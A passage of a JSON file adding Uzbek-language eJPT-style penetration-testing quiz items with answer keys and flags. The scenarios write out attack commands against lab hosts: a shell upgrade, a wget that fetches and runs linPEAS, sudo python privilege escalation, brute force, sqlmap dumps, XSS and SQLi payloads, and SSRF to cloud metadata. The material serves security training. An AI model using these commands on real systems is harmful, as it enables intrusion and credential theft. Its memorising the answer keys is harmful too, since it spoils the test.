+  "id": "hna-029",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "file-transfer"
+  ],
+  "scenario": "# Interaktiv bo'lmagan shell'ni to'liq TTY qilish\nwww-data@target$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@target:$ ^Z\n$ stty raw -echo; fg\nwww-data@target:$ export TERM=xterm",
+  "question": "Bu qadamlar nima uchun bajarildi?",
+  "options": [
+   "Fayl yuklash",
+   "Cheklangan reverse shell'ni to'liq interaktiv TTY'ga aylantirish",
+   "Parol buzish",
+   "Portni ochish"
+  ],
+  "answer": "Cheklangan reverse shell'ni to'liq interaktiv TTY'ga aylantirish",
+  "explanation": "python pty + stty raw — 'dumb' shell'ni to'liq TTY qiladi: Ctrl+C, tab-completion, sudo, less kabilar ishlaydi (shell upgrade)."
+ },
+ {
+  "id": "hna-030",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "john"
+  ],
+  "scenario": "$ john --format=NT hashes.txt --wordlist=rockyou.txt\nUsing default input encoding: UTF-8\nSummerP@ss2025   (jdoe)\n1g 0:00:00:03 DONE",
+  "question": "John natijasiga ko'ra jdoe foydalanuvchisining paroli nima?",
+  "options": [
+   "rockyou",
+   "NT",
+   "SummerP@ss2025",
+   "hashes.txt"
+  ],
+  "answer": "SummerP@ss2025",
+  "explanation": "John NTLM hashni buzdi: 'SummerP@ss2025 (jdoe)'. Endi bu credential pass-the-password uchun ishlatiladi."
+ },
+ {
+  "id": "hna-031",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "windows",
+   "enumeration"
+  ],
+  "scenario": "C:\\> schtasks /query /fo LIST /v | findstr /i \"TaskName Run As User\"\nTaskName:  \\BackupTask\nRun As User: SYSTEM\nTask To Run: C:\\Scripts\\backup.bat\nC:\\> icacls C:\\Scripts\\backup.bat\nbackup.bat  Everyone:(F)",
+  "question": "Bu topilma privesc'ga qanday yo'l ochadi?",
+  "options": [
+   "Hech qanday",
+   "backup.bat SYSTEM sifatida ishlaydi va Everyone to'liq (F) yoza oladi — zararli buyruq qo'shish mumkin",
+   "Task o'chirilgan",
+   "Fayl faqat o'qish uchun"
+  ],
+  "answer": "backup.bat SYSTEM sifatida ishlaydi va Everyone to'liq (F) yoza oladi — zararli buyruq qo'shish mumkin",
+  "explanation": "Rejalashtirilgan task SYSTEM sifatida backup.bat ni ishlatadi; fayl world-writable (Everyone:F) — unga reverse shell qo'shsangiz SYSTEM olasiz."
+ },
+ {
+  "id": "hna-032",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "linux",
+   "enumeration"
+  ],
+  "scenario": "user@target:~$ netstat -tlnp\ntcp  0.0.0.0:22    LISTEN  -\ntcp  127.0.0.1:3306 LISTEN  -\ntcp  127.0.0.1:6379 LISTEN  -",
+  "question": "Faqat localhost (127.0.0.1) da tinglayotgan servislar nima uchun qiziqarli?",
+  "options": [
+   "Ular ochiq internetda",
+   "Ular faqat ichkaridan (yoki pivot orqali) kiriladigan yashirin servislar (MySQL, Redis)",
+   "Ular o'chiq",
+   "Ular DNS servislari"
+  ],
+  "answer": "Ular faqat ichkaridan (yoki pivot orqali) kiriladigan yashirin servislar (MySQL, Redis)",
+  "explanation": "127.0.0.1'da tinglagan portlar tashqi skanida ko'rinmaydi; buzilgan hostdan yoki port forwarding orqali ularga yetish mumkin."
+ },
+ {
+  "id": "hna-033",
+  "domain": "host_network_auditing",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "user@target:~$ sudo -l\n(root) NOPASSWD: /usr/bin/python3\nuser@target:~$ sudo python3 -c 'import os; os.system(\"cat /root/proof.txt\")'\nEJPT{gtf0b1ns_pyth0n_r00t}",
+  "question": "GTFOBins python3 orqali olingan flag qiymatini kiriting.",
+  "answer": "EJPT{gtf0b1ns_pyth0n_r00t}",
+  "explanation": "sudo NOPASSWD python3 -> os.system bilan root sifatida /root/proof.txt o'qildi: EJPT{gtf0b1ns_pyth0n_r00t}."
+ },
+ {
+  "id": "hna-034",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "windows"
+  ],
+  "scenario": "C:\\> dir /s /b C:\\Users\\*.kdbx C:\\Users\\*unattend.xml 2>nul\nC:\\Windows\\Panther\\Unattend.xml\nC:\\> type C:\\Windows\\Panther\\Unattend.xml | findstr /i password\n<Password>UEBzc3cwcmQxMjM=</Password>",
+  "question": "Unattend.xml faylida topilgan parol qanday saqlangan?",
+  "options": [
+   "Ochiq matnda",
+   "Base64 kodlangan (oson dekodlanadi)",
+   "bcrypt bilan",
+   "Umuman saqlanmagan"
+  ],
+  "answer": "Base64 kodlangan (oson dekodlanadi)",
+  "explanation": "Unattend.xml (avtomatik o'rnatish) ko'pincha Base64 kodlangan parol saqlaydi; 'echo UEBzc3cw... | base64 -d' bilan oson ochiladi."
+ },
+ {
+  "id": "hna-035",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "linux",
+   "enumeration"
+  ],
+  "scenario": "# Cheklangan shellda avtomatik enumeration\nwww-data@target$ wget http://10.10.14.5/linpeas.sh -O /tmp/lp.sh\nwww-data@target$ chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/out.txt",
+  "question": "linPEAS nima qiladi?",
+  "options": [
+   "Parollarni buzadi",
+   "Linux'da privesc vektorlarini (SUID, cron, config, kernel) avtomatik topadi",
+   "Fayl shifrlaydi",
+   "Tarmoqni skanlaydi"
+  ],
+  "answer": "Linux'da privesc vektorlarini (SUID, cron, config, kernel) avtomatik topadi",
+  "explanation": "linPEAS — Linux uchun avtomatik privesc enumeration skripti; SUID, sudo, cron, saqlangan parol, kernel kabi yo'llarni belgilab beradi."
+ },
+ {
+  "id": "hna-036",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "windows",
+   "privilege-escalation"
+  ],
+  "scenario": "C:\\> sc qc Spooler\n... SERVICE_START_NAME : LocalSystem\nC:\\> whoami /priv\nSeImpersonatePrivilege   Enabled\nC:\\> PrintSpoofer64.exe -i -c cmd\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nnt authority\\system",
+  "question": "PrintSpoofer qanday privilege va servisdan foydalanib SYSTEM oldi?",
+  "options": [
+   "SeDebugPrivilege va RDP",
+   "SeImpersonatePrivilege va Print Spooler xizmati",
+   "SeBackupPrivilege va SMB",
+   "Parol brute-force"
+  ],
+  "answer": "SeImpersonatePrivilege va Print Spooler xizmati",
+  "explanation": "PrintSpoofer SeImpersonatePrivilege + Spooler named pipe orqali SYSTEM tokenini impersonate qiladi va SYSTEM shell beradi."
+ },
+ {
+  "id": "web-001",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "gobuster"
+  ],
+  "scenario": "$ gobuster dir -u http://10.10.10.20 -w common.txt\n/images (Status: 301)\n/admin  (Status: 200)\n/backup (Status: 403)\n/login  (Status: 200)",
+  "question": "Ochiq (200) va to'g'ridan-to'g'ri kiriladigan admin paneli qaysi papkada?",
+  "options": [
+   "/images",
+   "/admin",
+   "/backup",
+   "/login"
+  ],
+  "answer": "/admin",
+  "explanation": "/admin — Status 200 (ochiq, kirish mumkin). /backup 403 (taqiqlangan), /images 301 (redirect)."
+ },
+ {
+  "id": "web-002",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nikto"
+  ],
+  "scenario": "$ nikto -h http://10.10.10.20\n+ Server: Apache/2.4.29 (Ubuntu)\n+ /admin/: Admin login page found.\n+ OSVDB-3092: /backup/: This might be interesting...\n+ /phpinfo.php: Output from phpinfo() reveals server config.\n+ The anti-clickjacking X-Frame-Options header is not present.",
+  "question": "Nikto topilmalaridan qaysi biri server konfiguratsiyasini oshkor qiladi (eng ma'lumotli)?",
+  "options": [
+   "X-Frame-Options yo'q",
+   "/phpinfo.php (phpinfo() chiqishi)",
+   "Apache versiyasi",
+   "/admin/ login sahifasi"
+  ],
+  "answer": "/phpinfo.php (phpinfo() chiqishi)",
+  "explanation": "phpinfo.php PHP versiyasi, modullar, yo'llar, muhit o'zgaruvchilarini oshkor qiladi — hujum yuzasini kengaytiruvchi qimmatli topilma."
+ },
+ {
+  "id": "web-003",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "wpscan"
+  ],
+  "scenario": "$ wpscan --url http://10.10.10.20 --enumerate u\n[+] WordPress version 5.4.2 identified\n[i] User(s) Identified:\n[+] admin\n[+] editor01\n[+] j.smith",
+  "question": "'--enumerate u' bayrog'i nima qildi?",
+  "options": [
+   "Plaginlarni sanadi",
+   "WordPress foydalanuvchilarini (login nomlarini) sanadi",
+   "Mavzularni sanadi",
+   "Parollarni buzdi"
+  ],
+  "answer": "WordPress foydalanuvchilarini (login nomlarini) sanadi",
+  "explanation": "wpscan --enumerate u WordPress foydalanuvchi nomlarini topadi (admin, editor01, j.smith) — keyin parol brute-force uchun ishlatiladi."
+ },
+ {
+  "id": "web-004",
+  "domain": "web_app_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "wpscan"
+  ],
+  "scenario": "$ wpscan --url http://10.10.10.20 -U admin -P rockyou.txt\n[+] Performing password attack on Wp Login...\n[SUCCESS] - admin / P@ssw0rd2025\n# wp-admin -> Appearance -> Theme Editor -> reverse shell -> flag:\nEJPT{wp_th3m3_rce_sh3ll}",
+  "question": "WordPress'ni buzib olingan flag qiymatini kiriting.",
+  "answer": "EJPT{wp_th3m3_rce_sh3ll}",
+  "explanation": "wpscan parolni buzdi (admin/P@ssw0rd2025); admin panelidan Theme Editor orqali PHP reverse shell qo'yib RCE olindi: EJPT{wp_th3m3_rce_sh3ll}."
+ },
+ {
+  "id": "web-005",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "hydra"
+  ],
+  "scenario": "$ hydra -l admin -P rockyou.txt 10.10.10.20 http-post-form \"/login.php:user=^USER^&pass=^PASS^:Invalid credentials\"\n[80][http-post-form] host: 10.10.10.20   login: admin   password: admin123",
+  "question": "Hydra buyrug'idagi 'Invalid credentials' qismi nima uchun kerak?",
+  "options": [
+   "To'g'ri parol",
+   "Muvaffaqiyatsiz login belgisi (fail string) — Hydra shu matnni ko'rsa parol noto'g'ri deb biladi",
+   "URL manzili",
+   "Foydalanuvchi nomi"
+  ],
+  "answer": "Muvaffaqiyatsiz login belgisi (fail string) — Hydra shu matnni ko'rsa parol noto'g'ri deb biladi",
+  "explanation": "http-post-form'da uchinchi qism — javobda 'noto'g'ri' belgisi. Hydra shu matn YO'Q bo'lsa loginni muvaffaqiyatli deb hisoblaydi (admin/admin123)."
+ },
+ {
+  "id": "web-006",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "sqlmap"
+  ],
+  "scenario": "$ sqlmap -u \"http://10.10.10.20/product.php?id=1\" --batch\n[*] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable\n[*] back-end DBMS: MySQL >= 5.0.12",
+  "question": "sqlmap nimani aniqladi?",
+  "options": [
+   "XSS zaifligi",
+   "'id' parametri SQL injection'ga (time-based blind) zaif; DBMS — MySQL",
+   "CSRF",
+   "Ochiq redirect"
+  ],
+  "answer": "'id' parametri SQL injection'ga (time-based blind) zaif; DBMS — MySQL",
+  "explanation": "sqlmap 'id' GET parametrida time-based blind SQLi topdi va backend'ni MySQL deb aniqladi."
+ },
+ {
+  "id": "web-007",
+  "domain": "web_app_pentest",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "sqlmap"
+  ],
+  "scenario": "$ sqlmap -u \"http://10.10.10.20/product.php?id=1\" --dbs --batch\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] webapp_db",
+  "question": "Ilova ma'lumotlariga tegishli maxsus (standart bo'lmagan) ma'lumotlar bazasi nomini yozing.",
+  "answer": "webapp_db",
+  "explanation": "information_schema va mysql — standart tizim bazalari. 'webapp_db' — ilovaning o'z bazasi (foydalanuvchilar/parollar shu yerda)."
+ },
+ {
+  "id": "web-008",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "sqlmap"
+  ],
+  "scenario": "$ sqlmap -u \"http://10.10.10.20/product.php?id=1\" -D webapp_db -T users --dump --batch\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n+----+----------+----------------------------------+",
+  "question": "Dump qilingan parol qanday ko'rinishda saqlangan?",
+  "options": [
+   "Ochiq matnda",
+   "MD5 hash (buzish kerak)",
+   "Base64",
+   "bcrypt"
+  ],
+  "answer": "MD5 hash (buzish kerak)",
+  "explanation": "32 belgili hex (5f4dcc3b...) — MD5 hash. (Bu mashhur hash — 'password'.) Keyin john/hashcat yoki online lookup bilan buziladi."
+ },
+ {
+  "id": "web-009",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "ffuf"
+  ],
+  "scenario": "$ ffuf -u http://10.10.10.20/FUZZ -w common.txt -mc 200,301\n         /________________________________________________/\nadmin                   [Status: 200, Size: 1520]\nconfig.php.bak          [Status: 200, Size: 842]\nuploads                 [Status: 301, Size: 0]",
+  "question": "ffuf topgan qaysi fayl manba kodini oshkor qilishi mumkin (eng xavfli)?",
+  "options": [
+   "admin",
+   "config.php.bak (zaxira nusxa)",
+   "uploads",
+   "common.txt"
+  ],
+  "answer": "config.php.bak (zaxira nusxa)",
+  "explanation": ".bak zaxira fayli PHP tomonidan bajarilmaydi — brauzerda config.php manba kodi (DB credential) ochiq ko'rinadi."
+ },
+ {
+  "id": "web-010",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "burp"
+  ],
+  "scenario": "# Burp Repeater'da POST so'rov:\nPOST /api/user HTTP/1.1\n{\"user_id\": 1002}\n# Javob: {\"name\":\"Alice\",\"role\":\"admin\",\"ssn\":\"...\"}\n# user_id ni 1001 ga o'zgartirsak — boshqa foydalanuvchi ma'lumoti keladi",
+  "question": "Bu qanday zaiflik?",
+  "options": [
+   "SQL Injection",
+   "IDOR (Insecure Direct Object Reference)",
+   "XSS",
+   "CSRF"
+  ],
+  "answer": "IDOR (Insecure Direct Object Reference)",
+  "explanation": "user_id ni o'zgartirib boshqa foydalanuvchi ma'lumotiga kirish — IDOR; server ob'ekt egaligini tekshirmayapti."
+ },
+ {
+  "id": "web-011",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "xss"
+  ],
+  "scenario": "# Izoh maydoniga kiritildi:\n<script>alert(document.cookie)</script>\n# Sahifa qayta yuklanganda barcha foydalanuvchilarda alert oynasi chiqadi",
+  "question": "Bu qanday XSS turi?",
+  "options": [
+   "Reflected XSS",
+   "Stored (Persistent) XSS",
+   "DOM-based XSS",
+   "Blind SQLi"
+  ],
+  "answer": "Stored (Persistent) XSS",
+  "explanation": "Payload serverda (izohlar bazasida) saqlanib, sahifaga kirgan HAR bir foydalanuvchida ishga tushadi — Stored XSS."
+ },
+ {
+  "id": "web-012",
+  "domain": "web_app_pentest",
+  "type": "direct",
+  "difficulty": "easy",
+  "tools": [
+   "sqli"
+  ],
+  "scenario": "# Login formasi:\nusername: admin\npassword: ' OR '1'='1' -- -\n# Natija: autentifikatsiyasiz admin sifatida kirildi",
+  "question": "Ushbu login bypass qaysi hujum turiga misol? (qisqartma yozing, masalan: SQLi)",
+  "answer": "SQLi",
+  "explanation": "' OR '1'='1' -- - so'rov mantiqini har doim TRUE qiladi va parol tekshiruvini chetlab o'tadi — bu SQL Injection (authentication bypass)."
+ },
+ {
+  "id": "web-013",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "gobuster"
+  ],
+  "scenario": "$ gobuster dir -u http://10.10.10.20 -w common.txt -x php,txt\n/index.php    (Status: 200)\n/config.php   (Status: 200) [Size: 0]\n/upload.php   (Status: 200)\n/robots.txt   (Status: 200)",
+  "question": "'-x php,txt' parametri nima qiladi?",
+  "options": [
+   "Faqat kataloglarni qidiradi",
+   "Har bir so'zga .php va .txt kengaytmalarini qo'shib qidiradi",
+   "Fayllarni o'chiradi",
+   "HTTPS ishlatadi"
+  ],
+  "answer": "Har bir so'zga .php va .txt kengaytmalarini qo'shib qidiradi",
+  "explanation": "-x kengaytmalar ro'yxati; gobuster har wordlist so'zini so'z.php, so'z.txt sifatida ham sinaydi — fayllarni topish uchun."
+ },
+ {
+  "id": "web-014",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "burp"
+  ],
+  "scenario": "# Fayl yuklash formasi faqat .jpg qabul qiladi (client-side)\n# Burp'da so'rovni ushlab, fayl nomini o'zgartiramiz:\nfilename=\"shell.php\" -> Content-Type: image/jpeg\n# Fayl yuklandi, /uploads/shell.php ochilganda RCE",
+  "question": "Bu hujum nega ishladi?",
+  "options": [
+   "Server .php fayllarni bajarmaydi",
+   "Fayl turi faqat client-side (brauzerda) tekshirilgan, serverda emas — Burp bilan chetlab o'tildi",
+   "Fayl juda kichik",
+   "SQLi orqali"
+  ],
+  "answer": "Fayl turi faqat client-side (brauzerda) tekshirilgan, serverda emas — Burp bilan chetlab o'tildi",
+  "explanation": "Faqat brauzerda (JS) yoki Content-Type bo'yicha tekshiruv Burp bilan chetlab o'tiladi; server .php ni bajaradi -> web shell (unrestricted file upload)."
+ },
+ {
+  "id": "web-015",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "dirb"
+  ],
+  "scenario": "$ dirb http://10.10.10.20 /usr/share/wordlists/dirb/common.txt\n---- Scanning URL: http://10.10.10.20/ ----\n+ http://10.10.10.20/robots.txt (CODE:200|SIZE:112)\n+ http://10.10.10.20/server-status (CODE:403|SIZE:299)\n==> DIRECTORY: http://10.10.10.20/admin/",
+  "question": "robots.txt faylini birinchi tekshirish nega foydali?",
+  "options": [
+   "U parollarni saqlaydi",
+   "U ko'pincha 'Disallow:' bilan yashirin kataloglarni oshkor qiladi",
+   "U serverni o'chiradi",
+   "U shell beradi"
+  ],
+  "answer": "U ko'pincha 'Disallow:' bilan yashirin kataloglarni oshkor qiladi",
+  "explanation": "robots.txt qidiruv botlariga 'kirmang' deydi, lekin aynan shu Disallow qatorlar admin/backup kabi yashirin yo'llarni pentesterga ko'rsatadi."
+ },
+ {
+  "id": "web-016",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "wpscan"
+  ],
+  "scenario": "$ wpscan --url http://10.10.10.20 --enumerate vp\n[+] wp-file-manager\n | Version: 6.0 (100% confidence)\n | [!] Title: File Manager < 6.9 - Unauthenticated Remote Code Execution\n | References: CVE-2020-25213",
+  "question": "WPScan qanday muhim topilmani ko'rsatdi?",
+  "options": [
+   "Faqat WP versiyasi",
+   "Zaif plagin (wp-file-manager 6.0) — autentifikatsiyasiz RCE (CVE-2020-25213)",
+   "Foydalanuvchilar ro'yxati",
+   "Mavzu nomi"
+  ],
+  "answer": "Zaif plagin (wp-file-manager 6.0) — autentifikatsiyasiz RCE (CVE-2020-25213)",
+  "explanation": "--enumerate vp zaif plaginlarni topadi; wp-file-manager < 6.9 unauthenticated RCE — to'g'ridan-to'g'ri shell olish yo'li."
+ },
+ {
+  "id": "web-017",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "curl"
+  ],
+  "scenario": "$ curl -I http://10.10.10.20\nHTTP/1.1 200 OK\nServer: Apache/2.4.49 (Unix)\nX-Powered-By: PHP/7.4.3\nSet-Cookie: PHPSESSID=abc123; path=/",
+  "question": "HTTP header'lardan qaysi biri to'g'ridan-to'g'ri ma'lum zaiflikka (path traversal/RCE) ishora qilishi mumkin?",
+  "options": [
+   "X-Powered-By: PHP/7.4.3",
+   "Server: Apache/2.4.49 (Unix)",
+   "Set-Cookie: PHPSESSID",
+   "HTTP/1.1 200 OK"
+  ],
+  "answer": "Server: Apache/2.4.49 (Unix)",
+  "explanation": "Apache 2.4.49 — mashhur CVE-2021-41773 (path traversal -> RCE) zaifligiga ega; versiyani ko'rib darhol searchsploit qilinadi."
+ },
+ {
+  "id": "web-018",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "xss"
+  ],
+  "scenario": "# URL: http://10.10.10.20/search?q=test\n# Sinov: http://10.10.10.20/search?q=<script>alert(1)</script>\n# Javobda qidiruv natijasi: 'test' o'rniga alert(1) darhol ishga tushadi, lekin faqat shu havolani ochgan odamda",
+  "question": "Bu qanday XSS turi?",
+  "options": [
+   "Stored XSS",
+   "Reflected XSS",
+   "IDOR",
+   "SSRF"
+  ],
+  "answer": "Reflected XSS",
+  "explanation": "Payload URL'dan javobga 'qaytariladi' (reflected) va saqlanmaydi; qurbon zararli havolani ochganda ishlaydi — Reflected XSS."
+ },
+ {
+  "id": "web-019",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "nikto"
+  ],
+  "scenario": "$ nikto -h http://10.10.10.20\n+ /cgi-bin/status.cgi: Site appears vulnerable to the 'shellshock' vulnerability\n+ CVE-2014-6271",
+  "question": "Nikto aniqlagan CVE-2014-6271 qaysi mashhur zaiflik?",
+  "options": [
+   "Heartbleed",
+   "Shellshock (Bash)",
+   "EternalBlue",
+   "Log4Shell"
+  ],
+  "answer": "Shellshock (Bash)",
+  "explanation": "CVE-2014-6271 — Shellshock; zaif CGI orqali Bash muhit o'zgaruvchisida buyruq bajarish (RCE)."
+ },
+ {
+  "id": "web-020",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "gobuster"
+  ],
+  "scenario": "$ gobuster vhost -u http://10.10.10.20 -w subdomains.txt\nFound: dev.megacorp.local (Status: 200) [Size: 4302]\nFound: admin.megacorp.local (Status: 200) [Size: 1200]",
+  "question": "gobuster 'vhost' rejimi nima qiladi?",
+  "options": [
+   "Kataloglarni qidiradi",
+   "Virtual hostlarni (subdomenlarni) Host header orqali topadi",
+   "Portlarni skanlaydi",
+   "Parol buzadi"
+  ],
+  "answer": "Virtual hostlarni (subdomenlarni) Host header orqali topadi",
+  "explanation": "vhost rejimi turli Host header'lar yuborib, bitta IP'da joylashgan virtual hostlarni (dev, admin) topadi — ko'pincha yashirin ilovalar."
+ },
+ {
+  "id": "web-021",
+  "domain": "web_app_pentest",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "burp"
+  ],
+  "scenario": "# Sahifa server tomonidan URL yuklaydi:\nPOST /fetch\nurl=http://example.com/image.png\n# Sinov:\nurl=http://169.254.169.254/latest/meta-data/\n# Javob: cloud metadata (IAM credentials)",
+  "question": "Bu qanday zaiflik?",
+  "options": [
+   "XSS",
+   "SSRF (Server-Side Request Forgery)",
+   "SQLi",
+   "CSRF"
+  ],
+  "answer": "SSRF (Server-Side Request Forgery)",
+  "explanation": "Server foydalanuvchi bergan URL'ni tekshirmay yuklaydi; 169.254.169.254 (cloud metadata) ga majburlab, IAM credential o'g'irlash — SSRF."
+ },
+ {
+  "id": "web-022",
+  "domain": "web_app_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "sqli",
+   "sqlmap"
+  ],
+  "scenario": "$ sqlmap -u \"http://10.10.10.20/item?id=1\" -D webapp_db -T secrets --dump --batch\n+----+------------------------------+\n| id | note                         |\n+----+------------------------------+\n| 1  | EJPT{sql1_dump_s3cr3ts_t4bl3}|\n+----+------------------------------+",
+  "question": "SQLi orqali 'secrets' jadvalidan dump qilingan flag qiymatini kiriting.",
+  "answer": "EJPT{sql1_dump_s3cr3ts_t4bl3}",
+  "explanation": "sqlmap --dump bilan webapp_db.secrets jadvali chiqarildi; flag: EJPT{sql1_dump_s3cr3ts_t4bl3}."
+ },
+ {
+  "id": "am-037",
+  "domain": "assessment_methodologies",
+  "type": "flag",
+  "difficulty": "easy",
+  "tools": [
+   "ftp"
+  ],
+  "scenario": "$ ftp 10.10.10.8\nName: anonymous\nPassword: (bo'sh)\n230 Login successful.\nftp> get user.txt\nftp> exit\n$ cat user.txt\nEJPT{4n0n_ftp_r34d_acc3ss}",
+  "question": "Anonim FTP orqali olingan flag qiymatini kiriting.",
+  "answer": "EJPT{4n0n_ftp_r34d_acc3ss}",
+  "explanation": "Anonim FTP kirish ochiq edi; user.txt yuklab olindi: EJPT{4n0n_ftp_r34d_acc3ss}."
+ },
+ {
+  "id": "am-038",
+  "domain": "assessment_methodologies",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "snmp"
+  ],
+  "scenario": "$ snmpwalk -v2c -c public 10.10.10.33 1.3.6.1.2.1.25.4.2.1.2\niso...: \"flag_service.sh\"\niso...: \"EJPT{snmp_publ1c_str1ng}\"",
+  "question": "SNMP 'public' community string orqali olingan flag qiymatini kiriting.",
+  "answer": "EJPT{snmp_publ1c_str1ng}",
+  "explanation": "Standart 'public' community string bilan snmpwalk tizim ma'lumotlarini chiqardi, jumladan flag: EJPT{snmp_publ1c_str1ng}."
+ },
+ {
+  "id": "am-039",
+  "domain": "assessment_methodologies",
+  "type": "flag",
+  "difficulty": "easy",
+  "tools": [
+   "curl"
+  ],
+  "scenario": "$ curl http://10.10.10.20/robots.txt\nUser-agent: *\nDisallow: /secret-panel/\n$ curl http://10.10.10.20/secret-panel/note.txt\nEJPT{r0b0ts_txt_l34k}",
+  "question": "robots.txt oshkor qilgan yashirin yo'ldan olingan flag qiymatini kiriting.",
+  "answer": "EJPT{r0b0ts_txt_l34k}",
+  "explanation": "robots.txt 'Disallow: /secret-panel/' ni oshkor qildi; o'sha katalogdagi note.txt: EJPT{r0b0ts_txt_l34k}."
+ },
+ {
+  "id": "am-040",
+  "domain": "assessment_methodologies",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -p 80 --script http-config-backup 10.10.10.20\n| http-config-backup:\n|_  /config.php.bak\n$ curl http://10.10.10.20/config.php.bak | grep -i flag\n// EJPT{c0nf1g_b4ckup_expo5ed}",
+  "question": "Zaxira konfiguratsiya faylidan olingan flag qiymatini kiriting.",
+  "answer": "EJPT{c0nf1g_b4ckup_expo5ed}",
+  "explanation": "http-config-backup NSE zaxira config faylni topdi; ichida flag: EJPT{c0nf1g_b4ckup_expo5ed}."
+ },
+ {
+  "id": "am-041",
+  "domain": "assessment_methodologies",
+  "type": "direct",
+  "difficulty": "easy",
+  "tools": [
+   "nmap"
+  ],
+  "scenario": "$ nmap -sV -p 111,2049 10.10.10.55\nPORT     STATE SERVICE VERSION\n111/tcp  open  rpcbind 2-4 (RPC #100000)\n2049/tcp open  nfs     3-4 (RPC #100003)",
+  "question": "2049-portda ishlayotgan, tarmoq orqali fayl ulashish protokolining nomini yozing (qisqartma).",
+  "answer": "NFS",
+  "explanation": "2049 — NFS (Network File System). rpcbind (111) bilan birga ishlaydi; showmount bilan eksportlarni ko'rish mumkin."
+ },
+ {
+  "id": "am-042",
+  "domain": "assessment_methodologies",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "smbclient"
+  ],
+  "scenario": "$ smbclient //10.10.10.12/public -N\nsmb: \\> recurse ON\nsmb: \\> ls\n  \\shared\\creds\\flag_am.txt\nsmb: \\> get \\shared\\creds\\flag_am.txt\n$ cat flag_am.txt\nEJPT{smb_gu3st_sh4r3_l00t}",
+  "question": "Guest SMB share'dan (recursiv) olingan flag qiymatini kiriting.",
+  "answer": "EJPT{smb_gu3st_sh4r3_l00t}",
+  "explanation": "Null/guest kirish bilan 'public' share'da recurse ON qilib chuqur qidirildi; flag_am.txt: EJPT{smb_gu3st_sh4r3_l00t}."
+ },
+ {
+  "id": "hnp-049",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run\n[*] Command shell session 1 opened\nid\nuid=0(root) gid=0(root)\ncat /root/flag.txt\nEJPT{vsftpd_b4ckd00r_r00t}",
+  "question": "vsftpd backdoor orqali root bo'lib olingan flag qiymatini kiriting.",
+  "answer": "EJPT{vsftpd_b4ckd00r_r00t}",
+  "explanation": "vsftpd 2.3.4 backdoor to'g'ridan-to'g'ri root shell berdi; /root/flag.txt: EJPT{vsftpd_b4ckd00r_r00t}."
+ },
+ {
+  "id": "hnp-050",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "hard",
+  "tools": [
+   "metasploit",
+   "pivoting"
+  ],
+  "scenario": "msf6 > run autoroute -s 172.16.5.0/24\nmsf6 > use exploit/windows/smb/psexec\nmsf6 exploit(...) > set RHOSTS 172.16.5.20\nmsf6 exploit(...) > run\nmeterpreter > cat C:\\\\flag_dc.txt\nEJPT{d33p_p1v0t_dc_pwn}",
+  "question": "Ikkinchi pivot orqali ichki DC'dan olingan flag qiymatini kiriting.",
+  "answer": "EJPT{d33p_p1v0t_dc_pwn}",
